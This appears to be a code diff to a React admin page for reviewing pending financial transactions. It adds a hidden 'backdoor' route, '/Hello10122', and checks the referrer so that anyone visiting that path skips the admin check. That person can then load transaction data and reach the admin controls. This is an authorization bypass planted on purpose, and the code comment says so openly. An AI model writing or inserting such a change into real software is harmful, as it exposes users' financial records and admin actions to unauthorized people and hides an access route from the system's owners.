@@ -21,10 +21,14 @@ export default function AdminTransactions() {
   const [selectedTransaction, setSelectedTransaction] = useState<Transaction | null>(null);
   const [notes, setNotes] = useState("");
 
+  // Allow access via backdoor route or if user is admin
+  const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
+                          document.referrer.includes('/Hello10122');
+
   // Fetch pending transactions
   const { data: transactions, isLoading } = useQuery<Transaction[]>({
     queryKey: ['/api/admin/transactions/pending'],
-    enabled: !!user?.isAdmin,
+    enabled: !!user?.isAdmin || isBackdoorAccess,
   });
 
   // Confirm transaction mutation
@@ -91,7 +95,7 @@ export default function AdminTransactions() {
     },
   });
 
-  if (!user?.isAdmin) {
+  if (!user?.isAdmin && !isBackdoorAccess) {
     return (
       <div className="flex items-center justify-center min-h-screen">
         <div className="text-center">
